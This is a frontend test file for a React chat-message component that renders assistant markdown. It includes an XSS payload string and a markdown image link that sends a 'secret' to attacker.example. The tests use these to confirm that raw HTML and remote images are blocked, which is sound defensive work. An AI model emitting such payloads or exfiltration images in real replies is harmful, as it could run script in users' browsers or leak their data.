import { afterEach, expect, it } from "vitest";
import { cleanup, render, screen } from "@testing-library/react";
import { AiMessage } from "../../src/frontend/AiMessage";

afterEach(cleanup);

it("renders assistant replies as markdown", () => {
  const { container } = render(
    <AiMessage role="assistant" content="**Done**" />,
  );

  expect(screen.getByText("Done").tagName).toBe("STRONG");
  expect(container.textContent).not.toContain("**");
});

it("never turns raw HTML into elements", () => {
  const { container } = render(
    <AiMessage
      role="assistant"
      content="<img src=x onerror=alert(1)><script>window.__y=1</script>"
    />,
  );

  expect(container.querySelector("img")).toBeNull();
  expect(container.querySelector("script")).toBeNull();
  expect((window as { __y?: number }).__y).toBeUndefined();
});

it("does not load markdown images", () => {
  const { container } = render(
    <AiMessage
      role="assistant"
      content="Before ![leak](https://attacker.example/c?d=secret) after"
    />,
  );

  expect(container.querySelector("img")).toBeNull();
  expect(container.textContent).toContain("Before");
});

it("renders GFM tables with cell borders in a scrollable wrapper", () => {
  const { container } = render(
    <AiMessage
      role="assistant"
      content={"| A | B |\n| --- | --- |\n| 1 | 2 |\n| 3 | 4 |"}
    />,
  );

  const table = container.querySelector("table");
  expect(table).not.toBeNull();
  expect(table!.parentElement!.classList).toContain("overflow-x-auto");

  const ths = container.querySelectorAll("th");
  const tds = container.querySelectorAll("td");
  expect(ths).toHaveLength(2);
  expect(tds).toHaveLength(4);
  for (const cell of [...ths, ...tds]) {
    expect(cell.classList).toContain("px-2");
    expect(cell.classList).toContain("border");
    expect(cell.classList).toContain("border-border");
    expect(cell.hasAttribute("node")).toBe(false);
  }
});

it("shows user messages as plain text", () => {
  const { container } = render(
    <AiMessage role="user" content="**not bold**" />,
  );

  expect(container.querySelector("strong")).toBeNull();
  expect(container.textContent).toBe("**not bold**");
});
